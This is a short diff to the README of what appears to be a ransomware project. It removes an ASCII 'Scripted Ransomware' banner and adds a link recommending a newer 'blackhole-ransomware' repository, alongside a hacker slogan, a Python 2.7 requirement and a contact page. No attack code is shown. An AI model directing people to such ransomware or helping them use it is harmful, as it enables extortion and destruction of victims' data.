@@ -1,14 +1,4 @@
 
- (                                  (                                                  
- )\ )                  )     (      )\ )                                               
-(()/(   (  (        ( /(  (  )\ )  (()/(   )              (  (      )      ) (     (   
- /(_))( )( )\ `  )  )\())))\(()/(   /(_)( /(  (    (   (  )\))(    (    ( /( )(   ))\  
-(_))  )(()((_)/(/( (_))//((_)((_)) (_)) )(_)) )\ ) )\  )\((_)()\   )\  ')(_)(()\ /((_) 
-/ __|((_((_(_((_)_\| |_(_))  _| |  | _ ((_)_ _(_/(((_)((__(()((_)_((_))((_)_ ((_(_))   
-\__ / _| '_| | '_ \|  _/ -_/ _` |  |   / _` | ' \)(_-/ _ \ V  V | '  \(/ _` | '_/ -_)  
-|___\__|_| |_| .__/ \__\___\__,_|  |_|_\__,_|_||_|/__\___/\_/\_/|_|_|_|\__,_|_| \___|  
-             |_|                                                                       
-                         
 we hack for india code for india die for india
 
 # requirement
@@ -18,6 +8,8 @@ we hack for india code for india die for india
 2.python2.7
 
 Contact us : # https://www.facebook.com/Script1337/
+
+# this project get old try newer one : https://github.com/ScRiPt1337/blackhole-ransomware
 
 HOW TO USE
 
